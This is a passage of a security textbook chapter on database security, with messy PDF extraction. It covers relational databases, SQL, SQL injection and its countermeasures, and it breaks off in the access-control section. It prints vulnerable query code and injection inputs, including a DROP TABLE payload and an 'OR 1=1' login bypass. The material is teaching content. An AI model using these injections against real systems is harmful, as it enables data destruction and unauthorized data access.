PM\\n\\n\\n169\\r\\n5.1 The Need for Database Security\\r\\n5.2 Database Management Systems\\r\\n5.3 Relational Databases\\r\\nElements of a Relational Database System\\r\\nStructured Query Language\\r\\n5.4 SQL Injection Attacks\\r\\nA Typical SQLi Attack\\r\\nThe Injection Technique\\r\\nSQLi Attack Avenues and Types\\r\\nSQLi Countermeasures\\r\\n5.5 Database Access Control\\r\\nSQL-Based Access Definition\\r\\nCascading Authorizations\\r\\nRole-Based Access Control\\r\\n5.6 Inference\\r\\n5.7 Database Encryption\\r\\n5.8 Data Center Security\\r\\nData Center Elements\\r\\nData Center Security Considerations\\r\\nTIA-492\\r\\n5.9 Key Terms, Review Questions, and Problems\\r\\nDatabase and Data Center\\r\\nSecurity\\r\\nCHAPTER \\r\\nM05_STAL0611_04_GE_C05.indd 169 10/11/17 2:49 PM\\n\\n\\n170 CHAPTER 5 / DATABASE AND DATA CENTER SECURITY\\r\\nThis chapter looks at the unique security issues that relate to databases. The focus \\r\\nof this chapter is on relational database management systems (RDBMS). The rela\\ufffetional approach dominates industry, government, and research sectors, and is likely \\r\\nto do so for the foreseeable future. We begin with an overview of the need for data\\ufffebase-specific security techniques. Then we provide a brief introduction to database \\r\\nmanagement systems, followed by an overview of relational databases. Next, we look \\r\\nat the issue of database access control, followed by a discussion of the inference \\r\\nthreat. Then, we examine database encryption. Finally, we will examine the security \\r\\nissues related to the deployment of large data centers.\\r\\n5.1 THE NEED FOR DATABASE SECURITY\\r\\nOrganizational databases tend to concentrate sensitive information in a single logical \\r\\nsystem. Examples include:\\r\\n• Corporate financial data\\r\\n• Confidential phone records\\r\\n• Customer and employee information, such as name, Social Security number, \\r\\nbank account information, and credit card information\\r\\n• Proprietary product information\\r\\n• Health care information and medical records\\r\\nFor many businesses and other organizations, it is important to be able to pro\\ufffevide customers, partners, and employees with access to this information. But such \\r\\ninformation can be targeted by internal and external threats of misuse or unauthor\\ufffeized change. Accordingly, security specifically tailored to databases is an increasingly \\r\\nimportant component of an overall organizational security strategy.\\r\\nLEARNING OBJECTIVES\\r\\nAfter studying this chapter, you should be able to:\\r\\n◆ Understand the unique need for database security, separate from ordinary \\r\\ncomputer security measures.\\r\\n◆ Present an overview of the basic elements of a database management\\r\\nsystem.\\r\\n◆ Present an overview of the basic elements of a relational database system.\\r\\n◆ Define and explain SQL injection attacks.\\r\\n◆ Compare and contrast different approaches to database access control.\\r\\n◆ Explain how inference poses a security threat in database systems.\\r\\n◆ Discuss the use of encryption in a database system.\\r\\n◆ Discuss security issues related to data centers.\\r\\nM05_STAL0611_04_GE_C05.indd 170 10/11/17 2:49 PM\\n\\n\\n5.2 / DATABASE MANAGEMENT SYSTEMS 171\\r\\n[BENN06] cites the following reasons why database security has not kept pace \\r\\nwith the increased reliance on databases:\\r\\n1. There is a dramatic imbalance between the complexity of modern database \\r\\nmanagement systems (DBMS) and the security techniques used to protect these \\r\\ncritical systems. A DBMS is a very complex, large piece of software, providing \\r\\nmany options, all of which need to be well understood and then secured to avoid \\r\\ndata breaches. Although security techniques have advanced, the increasing \\r\\ncomplexity of the DBMS—with many new features and services—has brought \\r\\na number of new vulnerabilities and the potential for misuse.\\r\\n2. Databases have a sophisticated interaction protocol called the Structured Query \\r\\nLanguage (SQL), which is far more complex, than for example, the Hypertext \\r\\nTransfer Protocol (HTTP) used to interact with a Web service. Effective database \\r\\nsecurity requires a strategy based on a full understanding of the security vulner\\ufffeabilities of SQL.\\r\\n3. The typical organization lacks full-time database security personnel. The result is a \\r\\nmismatch between requirements and capabilities. Most organizations have a staff \\r\\nof database administrators, whose job is to manage the database to ensure avail\\ufffeability, performance, correctness, and ease of use. Such administrators may have \\r\\nlimited knowledge of security and little available time to master and apply security \\r\\ntechniques. On the other hand, those responsible for security within an organiza\\ufffetion may have very limited understanding of database and DBMS technology.\\r\\n4. Most enterprise environments consist of a heterogeneous mixture of database \\r\\nplatforms (Oracle, IBM DB2 and Informix, Microsoft, Sybase, etc.), enterprise \\r\\nplatforms (Oracle E-Business Suite, PeopleSoft, SAP, Siebel, etc.), and OS plat\\ufffeforms (UNIX, Linux, z/OS, and Windows, etc.). This creates an additional com\\ufffeplexity hurdle for security personnel.\\r\\nAn additional recent challenge for organizations is their increasing reliance on \\r\\ncloud technology to host part or all of the corporate database. This adds an additional \\r\\nburden to the security staff.\\r\\n5.2 DATABASE MANAGEMENT SYSTEMS\\r\\nIn some cases, an organization can function with a relatively simple collection of files \\r\\nof data. Each file may contain text (e.g., copies of memos and reports) or numerical \\r\\ndata (e.g., spreadsheets). A more elaborate file consists of a set of records. However, \\r\\nfor an organization of any appreciable size, a more complex structure known as a \\r\\ndatabase is required. A database is a structured collection of data stored for use \\r\\nby one or more applications. In addition to data, a database contains the relation\\ufffeships between data items and groups of data items. As an example of the distinc\\ufffetion between data files and a database, consider the following: A simple personnel \\r\\nfile might consist of a set of records, one for each employee. Each record gives the \\r\\nemployee’s name, address, date of birth, position, salary, and other details needed by \\r\\nthe personnel department. A personnel database includes a personnel file, as just \\r\\nM05_STAL0611_04_GE_C05.indd 171 10/11/17 2:49 PM\\n\\n\\n172 CHAPTER 5 / DATABASE AND DATA CENTER SECURITY\\r\\ndescribed. It may also include a time and attendance file, showing for each week the \\r\\nhours worked by each employee. With a database organization, these two files are \\r\\ntied together so a payroll program can extract the information about time worked \\r\\nand salary for each employee to generate paychecks.\\r\\nAccompanying the database is a database management system (DBMS), which \\r\\nis a suite of programs for constructing and maintaining the database and for offering \\r\\nad hoc query facilities to multiple users and applications. A query language provides \\r\\na uniform interface to the database for users and applications.\\r\\nFigure 5.1 provides a simplified block diagram of a DBMS architecture. Data\\ufffebase designers and administrators make use of a data definition language (DDL) \\r\\nto define the database logical structure and procedural properties, which are repre\\ufffesented by a set of database description tables. A data manipulation language (DML) \\r\\nprovides a powerful set of tools for application developers. Query languages are \\r\\ndeclarative languages designed to support end users. The database management sys\\ufffetem makes use of the database description tables to manage the physical database. \\r\\nThe interface to the database is through a file manager module and a transaction \\r\\nmanager module. In addition to the database description table, two other tables sup\\ufffeport the DBMS. The DBMS uses authorization tables to ensure the user has permis\\ufffesion to execute the query language statement on the database. The concurrent access \\r\\ntable prevents conflicts when simultaneous conflicting commands are executed.\\r\\nDatabase systems provide efficient access to large volumes of data and are vital \\r\\nto the operation of many organizations. Because of their complexity and criticality, \\r\\ndatabase systems generate security requirements that are beyond the capability of \\r\\ntypical OS-based security mechanisms or stand-alone security packages.\\r\\nFigure 5.1 DBMS Architecture\\r\\nPhysical\\r\\ndatabase\\r\\nDatabase\\r\\nutilities\\r\\nDatabase\\r\\ndescription\\r\\ntables\\r\\nAuthorization\\r\\ntables\\r\\nConcurrent\\r\\naccess\\r\\ntables\\r\\nDDL\\r\\nprocessor\\r\\nDML and query\\r\\nlanguage processor\\r\\nDBMS\\r\\nDDL = data definition language\\r\\nDML = data manipulation language\\r\\nTransaction\\r\\nmanager File manager\\r\\nUser\\r\\nqueries\\r\\nUser\\r\\napplications\\r\\nM05_STAL0611_04_GE_C05.indd 172 10/11/17 2:49 PM\\n\\n\\n5.3 / RELATIONAL DATABASES 173\\r\\nOperating system security mechanisms typically control read and write access \\r\\nto entire files. So, they could be used to allow a user to read or to write any informa\\ufffetion in, for example, a personnel file. But they could not be used to limit access to \\r\\nspecific records or fields in that file. A DBMS typically does allow this type of more \\r\\ndetailed access control to be specified. It also usually enables access controls to be \\r\\nspecified over a wider range of commands, such as to select, insert, update, or delete \\r\\nspecified items in the database. Thus, security services and mechanisms are needed \\r\\nthat are designed specifically for, and integrated with, database systems.\\r\\n5.3 RELATIONAL DATABASES\\r\\nThe basic building block of a relational database is a table of data, consisting of \\r\\nrows and columns, similar to a spreadsheet. Each column holds a particular type of \\r\\ndata, while each row contains a specific value for each column. Ideally, the table has \\r\\nat least one column in which each value is unique, thus serving as an identifier for a \\r\\ngiven entry. For example, a typical telephone directory contains one entry for each \\r\\nsubscriber, with columns for name, telephone number, and address. Such a table is \\r\\ncalled a flat file because it is a single two-dimensional (rows and columns) file. In \\r\\na flat file, all of the data are stored in a single table. For the telephone directory, \\r\\nthere might be a number of subscribers with the same name, but the telephone \\r\\nnumbers should be unique, so the telephone number serves as a unique identifier \\r\\nfor a row. However, two or more people sharing the same phone number might \\r\\neach be listed in the directory. To continue to hold all of the data for the telephone \\r\\ndirectory in a single table and to provide for a unique identifier for each row, we \\r\\ncould require a separate column for secondary subscriber, tertiary subscriber, and \\r\\nso on. The result would be that for each telephone number in use, there is a single \\r\\nentry in the table.\\r\\nThe drawback of using a single table is that some of the column positions for a \\r\\ngiven row may be blank (not used). In addition, any time a new service or new type \\r\\nof information is incorporated in the database, more columns must be added and the \\r\\ndatabase and accompanying software must be redesigned and rebuilt.\\r\\nThe relational database structure enables the creation of multiple tables tied \\r\\ntogether by a unique identifier that is present in all tables. Figure 5.2 shows how new \\r\\nservices and features can be added to the telephone database without reconstructing \\r\\nthe main table. In this example, there is a primary table with basic information for \\r\\neach telephone number. The telephone number serves as a primary key. The database \\r\\nadministrator can then define a new table with a column for the primary key and \\r\\nother columns for other information.\\r\\nUsers and applications use a relational query language to access the database. \\r\\nThe query language uses declarative statements rather than the procedural instruc\\ufffetions of a programming language. In essence, the query language allows the user to \\r\\nrequest selected items of data from all records that fit a given set of criteria. The \\r\\nsoftware then figures out how to extract the requested data from one or more tables. \\r\\nFor example, a telephone company representative could retrieve a subscriber’s billing \\r\\ninformation as well as the status of special services or the latest payment received, \\r\\nall displayed on one screen.\\r\\nM05_STAL0611_04_GE_C05.indd 173 10/11/17 2:49 PM\\n\\n\\n174 CHAPTER 5 / DATABASE AND DATA CENTER SECURITY\\r\\nElements of a Relational Database System\\r\\nIn relational database parlance, the basic building block is a relation, which is a \\r\\nflat table. Rows are referred to as tuples, and columns are referred to as attributes \\r\\n(see Table 5.1). A primary key is defined to be a portion of a row used to uniquely \\r\\nidentify a row in a table; the primary key consists of one or more column names. In \\r\\nthe example of Figure 5.2, a single attribute, PhoneNumber, is sufficient to uniquely \\r\\nidentify a row in a particular table. An abstract model of a relational database table is \\r\\nFigure 5.2 Example Relational Database Model A relational database uses mul\\ufffetiple tables related to one another by a designated key; in this case the key is the \\r\\nPhone-Number field.\\r\\nCALLER ID TABLE\\r\\nPhoneNumber\\r\\nADDITIONAL\\r\\nSUBSCRIBER TABLE\\r\\nHas service? PhoneNumber (Y/N)\\r\\nList of subscribers\\r\\nPRIMARY TABLE\\r\\nPhoneNumber\\r\\nLast name\\r\\nFirst name\\r\\naddress\\r\\nBILLING HISTORY\\r\\nTABLE\\r\\nPhoneNumber\\r\\nDate\\r\\nTransaction type\\r\\nTransaction amount\\r\\nCURRENT BILL\\r\\nTABLE\\r\\nPhoneNumber\\r\\nCurrent date\\r\\nPrevious balance\\r\\nCurrent charges\\r\\nDate of last payment\\r\\nAmount of last payment\\r\\nFormal Name Common Name Also Known As\\r\\nRelation Table File\\r\\nTuple Row Record\\r\\nAttribute Column Field\\r\\nTable 5.1 Basic Terminology for Relational Databases\\r\\nM05_STAL0611_04_GE_C05.indd 174 10/11/17 2:49 PM\\n\\n\\n5.3 / RELATIONAL DATABASES 175\\r\\nshown as Figure 5.3. There are N individuals, or entities, in the table and M attributes. \\r\\nEach attribute Aj\\r\\n has !Aj ! possible values, with xij denoting the value of attribute j\\r\\nfor entity i.\\r\\nTo create a relationship between two tables, the attributes that define the \\r\\nprimary key in one table must appear as attributes in another table, where they are \\r\\nreferred to as a foreign key. Whereas the value of a primary key must be unique \\r\\nfor each tuple (row) of its table, a foreign key value can appear multiple times in \\r\\na table, so there is a one-to-many relationship between a row in the table with the \\r\\nprimary key and rows in the table with the foreign key. Figure 5.4a provides an \\r\\nexample. In the Department table, the department ID (Did) is the primary key; \\r\\neach value is unique. This table gives the ID, name, and account number for each \\r\\ndepartment. The Employee table contains the name, salary code, employee ID, and \\r\\nphone number of each employee. The Employee table also indicates the depart\\ufffement to which each employee is assigned by including Did. Did is identified as a \\r\\nforeign key and provides the relationship between the Employee table and the \\r\\nDepartment table.\\r\\nA view is a virtual table. In essence, a view is the result of a query that returns \\r\\nselected rows and columns from one or more tables. Figure 5.4b is a view that includes \\r\\nthe employee name, ID, and phone number from the Employee table and the cor\\uffferesponding department name from the Department table. The linkage is the Did, so \\r\\nthe view table includes data from each row of the Employee table, with additional \\r\\ndata from the Department table. It is also possible to construct a view from a single \\r\\ntable. For example, one view of the Employee table consists of all rows, with the salary \\r\\ncode column deleted. A view can be qualified to include only some rows and/or some \\r\\ncolumns. For example, a view can be defined consisting of all rows in the Employee \\r\\ntable for which the Did = 15.\\r\\nViews are often used for security purposes. A view can provide restricted access \\r\\nto a relational database so a user or application only has access to certain rows or \\r\\ncolumns.\\r\\nFigure 5.3 Abstract Model of a Relational Database\\r\\nAttributes\\r\\nRecords\\r\\nA1\\r\\n1\\r\\ni\\r\\nN\\r\\nx11\\r\\nAj\\r\\nx1j x1M\\r\\nAM\\r\\nxij xiM\\r\\nxNj xNM\\r\\nxi1\\r\\nxN1\\r\\nM05_STAL0611_04_GE_C05.indd 175 10/11/17 2:49 PM\\n\\n\\n176 CHAPTER 5 / DATABASE AND DATA CENTER SECURITY\\r\\nStructured Query Language\\r\\nStructured Query Language (SQL) is a standardized language that can be used to \\r\\ndefine schema, manipulate, and query data in a relational database. There are several \\r\\nversions of the ANSI/ISO standard and a variety of different implementations, but \\r\\nall follow the same basic syntax and semantics.\\r\\nFor example, the two tables in Figure 5.4a are defined as follows:\\r\\nCREATE TABLE department (\\r\\n Did INTEGER PRIMARY KEY,\\r\\n Dname CHAR (30),\\r\\n Dacctno CHAR (6) )\\r\\nCREATE TABLE employee (\\r\\n Ename CHAR (30),\\r\\n Did INTEGER,\\r\\n SalaryCode INTEGER,\\r\\n Eid INTEGER PRIMARY KEY,\\r\\n Ephone CHAR (10),\\r\\n FOREIGN KEY (Did) REFERENCES department (Did) )\\r\\nFigure 5.4 Relational Database Example\\r\\nDepartment Table\\r\\nhuman resources\\r\\neducation\\r\\naccounts\\r\\npublic relations\\r\\nservices\\r\\nPrimary\\r\\nkey\\r\\n4\\r\\n8\\r\\n9\\r\\n13\\r\\n15\\r\\n528221\\r\\n202035\\r\\n709257\\r\\n755827\\r\\n223945\\r\\nDid Dname Dacctno\\r\\n(a) Two tables in a relational database\\r\\n(b) A view derived from the database\\r\\nDname Ename Eid Ephone\\r\\nRobin\\r\\nhuman resources\\r\\neducation\\r\\neducation\\r\\naccounts\\r\\npublic relations\\r\\nservices\\r\\nservices\\r\\nNeil\\r\\nJasmine\\r\\nCody\\r\\nHolly\\r\\nRobin\\r\\nSmith\\r\\n7712 6127099348\\r\\n6127092729\\r\\n6127091945\\r\\n6127099380\\r\\n6127092246\\r\\n6127092485\\r\\n6127093148\\r\\n3054\\r\\n2976\\r\\n4490\\r\\n5088\\r\\n2345\\r\\n9664\\r\\nEmployee Table\\r\\nEname Did Salarycode Eid Ephone\\r\\nForeign\\r\\nkey\\r\\nRobin\\r\\nNeil\\r\\nJasmine\\r\\nCody\\r\\nHolly\\r\\nRobin\\r\\nSmith\\r\\n15 23 2345 6127092485\\r\\n6127092246\\r\\n6127099348\\r\\n6127093148\\r\\n6127092729\\r\\n6127091945\\r\\n6127099380\\r\\n5088\\r\\n7712\\r\\n9664\\r\\n3054\\r\\n2976\\r\\n4490\\r\\n12\\r\\n26\\r\\n22\\r\\n23\\r\\n24\\r\\n21\\r\\n13\\r\\n4\\r\\n15\\r\\n8\\r\\n8\\r\\n9\\r\\nPrimary\\r\\nkey\\r\\nM05_STAL0611_04_GE_C05.indd 176 10/11/17 2:49 PM\\n\\n\\n5.4 / SQL INJECTION ATTACKS 177\\r\\nThe basic command for retrieving information is the SELECT statement. \\r\\nConsider this example:\\r\\nSELECT Ename, Eid, Ephone\\r\\n FROM Employee\\r\\n WHERE Did = 15\\r\\nThis query returns the Ename, Eid, and Ephone fields from the Employee table \\r\\nfor all employees assigned to department 15.\\r\\nThe view in Figure 5.4b is created using the following SQL statement:\\r\\nCREATE VIEW newtable (Dname, Ename, Eid, Ephone)\\r\\nAS SELECT D.Dname E.Ename, E.Eid, E.Ephone\\r\\nFROM Department D Employee E\\r\\nWHERE E.Did = D.Did\\r\\nThe preceding are just a few examples of SQL functionality. SQL statements \\r\\ncan be used to create tables, insert and delete data in tables, create views, and retrieve \\r\\ndata with query statements.\\r\\n5.4 SQL INJECTION ATTACKS\\r\\nThe SQL injection (SQLi) attack is one of the most prevalent and dangerous net\\ufffework-based security threats. Consider the following reports:\\r\\n1. The July 2013 Imperva Web Application Attack Report [IMPE13] surveyed a \\r\\ncross section of Web application servers in industry and monitored eight differ\\ufffeent types of common attacks. The report found that SQLi attacks ranked first \\r\\nor second in total number of attack incidents, the number of attack requests \\r\\nper attack incident, and average number of days per month that an application \\r\\nexperienced at least one attack incident. Imperva observed a single website that \\r\\nreceived 94,057 SQL injection attack requests in one day.\\r\\n2. The Open Web Application Security Project’s 2013 report [OWAS13] on the \\r\\n10 most critical Web application security risks listed injection attacks, especially \\r\\nSQLi attacks, as the top risk. This ranking is unchanged from its 2010 report.\\r\\n3. The Veracode 2016 State of Software Security Report [VERA16] found that per\\ufffecentage of applications affected by SQLi attacks is around 35%.\\r\\n4. The Trustwave 2016 Global Security Report [TRUS16] lists SQLi attacks as \\r\\none of the top two intrusion techniques. The report notes that SQLi can pose a \\r\\nsignificant threat to sensitive data such as personally identifiable information \\r\\n(PII) and credit card data, and it can be hard to prevent and relatively easy to \\r\\nexploit these attacks.\\r\\nIn general terms, an SQLi attack is designed to exploit the nature of Web appli\\ufffecation pages. In contrast to the static webpages of years gone by, most current websites \\r\\nhave dynamic components and content. Many such pages ask for information, such \\r\\nas location, personal identity information, and credit card information. This dynamic \\r\\nM05_STAL0611_04_GE_C05.indd 177 10/11/17 2:49 PM\\n\\n\\n178 CHAPTER 5 / DATABASE AND DATA CENTER SECURITY\\r\\ncontent is usually transferred to and from back-end databases that contain volumes of \\r\\ninformation—anything from cardholder data to which type of running shoes is most \\r\\npurchased. An application server webpage will make SQL queries to databases to \\r\\nsend and receive information critical to making a positive user experience.\\r\\nIn such an environment, an SQLi attack is designed to send malicious SQL \\r\\ncommands to the database server. The most common attack goal is bulk extraction \\r\\nof data. Attackers can dump database tables with hundreds of thousands of cus\\ufffetomer records. Depending on the environment, SQL injection can also be exploited \\r\\nto modify or delete data, execute arbitrary operating system commands, or launch \\r\\ndenial-of-service (DoS) attacks. SQL injection is one of several forms of injection \\r\\nattacks that we discuss more generally in Chapter 11.2.\\r\\nA Typical SQLi Attack\\r\\nSQLi is an attack that exploits a security vulnerability occurring in the database layer \\r\\nof an application (such as queries). Using SQL injection, the attacker can extract or \\r\\nmanipulate the Web application’s data. The attack is viable when user input is either \\r\\nincorrectly filtered for string literal escape characters embedded in SQL statements \\r\\nor user input is not strongly typed, and thereby unexpectedly executed.\\r\\nFigure 5.5, from [ACUN13], is a typical example of an SQLi attack. The steps \\r\\ninvolved are as follows:\\r\\n1. Hacker finds a vulnerability in a custom Web application and injects an SQL \\r\\ncommand to a database by sending the command to the Web server. The com\\ufffemand is injected into traffic that will be accepted by the firewall.\\r\\n2. The Web server receives the malicious code and sends it to the Web application \\r\\nserver.\\r\\n3. The Web application server receives the malicious code from the Web server and \\r\\nsends it to the database server.\\r\\n4. The database server executes the malicious code on the database. The database \\r\\nreturns data from credit cards table.\\r\\n5. The Web application server dynamically generates a page with data including \\r\\ncredit card details from the database.\\r\\n6. The Web server sends the credit card details to the hacker.\\r\\nThe Injection Technique\\r\\nThe SQLi attack typically works by prematurely terminating a text string and append\\ufffeing a new command. Because the inserted command may have additional strings \\r\\nappended to it before it is executed, the attacker terminates the injected string with \\r\\na comment mark “--”. Subsequent text is ignored at execution time.\\r\\nAs a simple example, consider a script that build an SQL query by combining \\r\\npredefined strings with text entered by a user:\\r\\nvar Shipcity;\\r\\nShipCity = Request.form (“ShipCity”);\\r\\nvar sql = “select * from OrdersTable where ShipCity = ‘” +\\r\\nShipCity + “‘”;\\r\\nM05_STAL0611_04_GE_C05.indd 178 10/11/17 2:49 PM\\n\\n\\n5.4 / SQL INJECTION ATTACKS 179\\r\\nThe intention of the script’s designer is that a user will enter the name of a city. \\r\\nFor example, when the script is executed, the user is prompted to enter a city, and if \\r\\nthe user enters Redmond, then the following SQL query is generated:\\r\\nSELECT * FROM OrdersTable WHERE ShipCity = ‘Redmond’\\r\\nSuppose, however, the user enters the following:\\r\\nBoston’; DROP table OrdersTable--\\r\\nThis results in the following SQL query:\\r\\nSELECT * FROM OrdersTable WHERE ShipCity =\\r\\n‘Redmond’; DROP table OrdersTable--\\r\\nThe semicolon is an indicator that separates two commands, and the double \\r\\ndash is an indicator that the remaining text of the current line is a comment and not \\r\\nto be executed. When the SQL server processes this statement, it will first select all \\r\\nrecords in OrdersTable where ShipCity is Redmond. Then, it executes the \\r\\nDROP request, which deletes the table.\\r\\nFigure 5.5 Typical SQL Injection Attack\\r\\nLegend:\\r\\nInternet\\r\\nRouter\\r\\nFirewall\\r\\nSwitch\\r\\nWireless\\r\\naccess point\\r\\nWeb servers\\r\\nWeb\\r\\napplication\\r\\nserver\\r\\nDatabase servers\\r\\nDatabase\\r\\nData exchanged\\r\\nbetween hacker\\r\\nand servers\\r\\nbetween hacker\\r\\nand Web server\\r\\nCredit card data is\\r\\nretrieved from \\r\\ndatabase\\r\\nM05_STAL0611_04_GE_C05.indd 179 10/11/17 2:49 PM\\n\\n\\n180 CHAPTER 5 / DATABASE AND DATA CENTER SECURITY\\r\\nSQLi Attack Avenues and Types\\r\\nWe can characterize SQLi attacks in terms of the avenue of attack and the type of \\r\\nattack [CHAN11, HALF06]. The main avenues of attack are as follows:\\r\\n• User input: In this case, attackers inject SQL commands by providing suit\\ufffeably crafted user input. A Web application can read user input in several \\r\\nways based on the environment in which the application is deployed. In most \\r\\nSQLi attacks that target Web applications, user input typically comes from \\r\\nform submissions that are sent to the Web application via HTTP GET or \\r\\nPOST requests. Web applications are generally able to access the user input \\r\\ncontained in these requests as they would access any other variable in the \\r\\nenvironment.\\r\\n• Server variables: Server variables are a collection of variables that contain \\r\\nHTTP headers, network protocol headers, and environmental variables. Web \\r\\napplications use these server variables in a variety of ways, such as logging \\r\\nusage statistics and identifying browsing trends. If these variables are logged to \\r\\na database without sanitization, this could create an SQL injection vulnerability. \\r\\nBecause attackers can forge the values that are placed in HTTP and network \\r\\nheaders, they can exploit this vulnerability by placing data directly into the \\r\\nheaders. When the query to log the server variable is issued to the database, the \\r\\nattack in the forged header is then triggered.\\r\\n• Second-order injection: Second-order injection occurs when incomplete pre\\ufffevention mechanisms against SQL injection attacks are in place. In second-order \\r\\ninjection, a malicious user could rely on data already present in the system or \\r\\ndatabase to trigger an SQL injection attack, so when the attack occurs, the input \\r\\nthat modifies the query to cause an attack does not come from the user, but \\r\\nfrom within the system itself.\\r\\n• Cookies: When a client returns to a Web application, cookies can be used to \\r\\nrestore the client’s state information. Because the client has control over cook\\ufffeies, an attacker could alter cookies such that when the application server builds \\r\\nan SQL query based on the cookie’s content, the structure and function of the \\r\\nquery is modified.\\r\\n• Physical user input: SQL injection is possible by supplying user input that con\\ufffestructs an attack outside the realm of Web requests. This user-input could take \\r\\nthe form of conventional barcodes, RFID tags, or even paper forms which are \\r\\nscanned using optical character recognition and passed to a database manage\\ufffement system.\\r\\nAttack types can be grouped into three main categories: inband, inferential, \\r\\nand out-of-band. An inband attack uses the same communication channel for inject\\ufffeing SQL code and retrieving results. The retrieved data are presented directly in the \\r\\napplication webpage. Inband attack types include the following:\\r\\n• Tautology: This form of attack injects code in one or more condi\\ufffetional statements so they always evaluate to true. For example, consider \\r\\nM05_STAL0611_04_GE_C05.indd 180 10/11/17 2:49 PM\\n\\n\\n5.4 / SQL INJECTION ATTACKS 181\\r\\nthis script, whose intent is to require the user to enter a valid name and \\r\\npassword:\\r\\n$query = “SELECT info FROM user WHERE name =\\r\\n’$_GET[“name”]’ AND pwd = ‘$_GET[“pwd”]’”;\\r\\nSuppose the attacker submits “ ‘ OR 1=1 --” for the name field. The \\r\\nresulting query would look like this:\\r\\nSELECT info FROM users WHERE name = ‘ ‘ OR 1=1 -- AND pwpd = ‘ ‘\\r\\nThe injected code effectively disables the password check (because of the \\r\\ncomment indicator --) and turns the entire WHERE clause into a tautology. \\r\\nThe database uses the conditional as the basis for evaluating each row and \\r\\ndeciding which ones to return to the application. Because the conditional is a \\r\\ntautology, the query evaluates to true for each row in the table and returns all \\r\\nof them.\\r\\n• End-of-line comment: After injecting code into a particular field, legitimate \\r\\ncode that follows are nullified through usage of end of line comments. An \\r\\nexample would be to add “- -” after inputs so that remaining queries are not \\r\\ntreated as executable code, but comments. The preceding tautology example is \\r\\nalso of this form.\\r\\n• Piggybacked queries: The attacker adds additional queries beyond the \\r\\nintended query, piggy-backing the attack on top of a legitimate request. This \\r\\ntechnique relies on server configurations that allow several different queries \\r\\nwithin a single string of code. The example in the preceding section is of this \\r\\nform.\\r\\nWith an inferential attack, there is no actual transfer of data, but the attacker \\r\\nis able to reconstruct the information by sending particular requests and observing \\r\\nthe resulting behavior of the website/database server. Inferential attack types include \\r\\nthe following:\\r\\n• Illegal/logically incorrect queries: This attack lets an attacker gather impor\\ufffetant information about the type and structure of the backend database of a \\r\\nWeb application. The attack is considered a preliminary, information-gathering \\r\\nstep for other attacks. The vulnerability leveraged by this attack is that the \\r\\ndefault error page returned by application servers is often overly descriptive. \\r\\nIn fact, the simple fact that an error messages is generated can often reveal \\r\\nvulnerable/injectable parameters to an attacker.\\r\\n• Blind SQL injection: Blind SQL injection allows attackers to infer the data \\r\\npresent in a database system even when the system is sufficiently secure to not \\r\\ndisplay any erroneous information back to the attacker. The attacker asks the \\r\\nserver true/false questions. If the injected statement evaluates to true, the site \\r\\ncontinues to function normally. If the statement evaluates to false, although \\r\\nM05_STAL0611_04_GE_C05.indd 181 10/11/17 2:49 PM\\n\\n\\n182 CHAPTER 5 / DATABASE AND DATA CENTER SECURITY\\r\\nthere is no descriptive error message, the page differs significantly from the \\r\\nnormally functioning page.\\r\\nIn an out-of-band attack, data are retrieved using a different channel (e.g., an \\r\\ne-mail with the results of the query is generated and sent to the tester). This can be \\r\\nused when there are limitations on information retrieval, but outbound connectivity \\r\\nfrom the database server is lax.\\r\\nSQLi Countermeasures\\r\\nBecause SQLi attacks are so prevalent, damaging, and varied both by attack avenue \\r\\nand type, a single countermeasure is insufficient. Rather an integrated set of tech\\ufffeniques is necessary. In this section, we provide a brief overview of the types of coun\\ufffetermeasures that are in use or being researched, using the classification in [SHAR13]. \\r\\nThese countermeasures can be classified into three types: defensive coding, detection, \\r\\nand run-time prevention.\\r\\nMany SQLi attacks succeed because developers have used insecure coding prac\\ufffetices, as we discuss in Chapter 11. Thus, defensive coding is an effective way to dramati\\ufffecally reduce the threat from SQLi. Examples of defensive coding include the following:\\r\\n• Manual defensive coding practices: A common vulnerability exploited by SQLi \\r\\nattacks is insufficient input validation. The straightforward solution for elimi\\ufffenating these vulnerabilities is to apply suitable defensive coding practices. An \\r\\nexample is input type checking, to check that inputs that are supposed to be \\r\\nnumeric contain no characters other than digits. This type of technique can \\r\\navoid attacks based on forcing errors in the database management system. \\r\\nAnother type of coding practice is one that performs pattern matching to try \\r\\nto distinguish normal input from abnormal input.\\r\\n• Parameterized query insertion: This approach attempts to prevent SQLi by \\r\\nallowing the application developer to more accurately specify the structure \\r\\nof an SQL query, and pass the value parameters to it separately such that any \\r\\nunsanitary user input is not allowed to modify the query structure.\\r\\n• SQL DOM: SQL DOM is a set of classes that enables automated data type vali\\ufffedation and escaping [MCCL05]. This approach uses encapsulation of database \\r\\nqueries to provide a safe and reliable way to access databases. This changes the \\r\\nquery-building process from an unregulated one that uses string concatenation \\r\\nto a systematic one that uses a type-checked API. Within the API, developers \\r\\nare able to systematically apply coding best practices such as input filtering and \\r\\nrigorous type checking of user input.\\r\\nA variety of detection methods have been developed, including the following:\\r\\n• Signature-based: This technique attempts to match specific attack patterns. \\r\\nSuch an approach must be constantly updated and may not work against self\\ufffemodifying attacks.\\r\\n• Anomaly-based: This approach attempts to define normal behavior then \\r\\ndetect behavior patterns outside the normal range. A number of approaches \\r\\nM05_STAL0611_04_GE_C05.indd 182 10/11/17 2:49 PM\\n\\n\\n5.5 / DATABASE ACCESS CONTROL 183\\r\\nhave been used. In general terms, there is a training phase, in which the \\r\\nsystem learns the range of normal behavior, followed by the actual detec\\ufffetion phase.\\r\\n• Code analysis: Code analysis techniques involve the use of a test suite to detect \\r\\nSQLi vulnerabilities. The test suite is designed to generate a wide range of SQLi \\r\\nattacks and assess the response of the system.\\r\\nFinally, a number of run-time prevention techniques have been developed as \\r\\nSQLi countermeasures. These techniques check queries at runtime to see if they \\r\\nconform to a model of expected queries. Various automated tools are available for \\r\\nthis purpose [CHAN11, SHAR13].\\r\\n5.5 DATABASE ACCESS CONTROL\\r\\nCommercial and open-source DBMSs typically provide an access control capabil\\ufffeity for the database. The DBMS operates on the assumption that the computer \\r\\nsystem has authenticated each user. As an additional line of defense, the com\\ufffeputer system may use the overall access control system described in Chapter 4 to \\r\\ndetermine whether a user may have access to the database as a whole. For users \\r\\nwho are authenticated and granted access to the database, a database access con\\ufffetrol system provides a specific capability that controls access to portions of the \\r\\ndatabase.\\r\\nCommercial and open-source DBMSs provide discretionary or role-based \\r\\naccess control. We defer a discussion of mandatory access control considerations to \\r\\nChapter 27. Typically, a DBMS can support a range of administrative policies, includ\\ufffeing the following:\\r\\n• Centralized administration: A small number of privileged users may grant and \\r\\nrevoke access rights.\\r\\n• Ownership-based administration:The owner (creator) of a table may grant and \\r\\nrevoke access rights to the 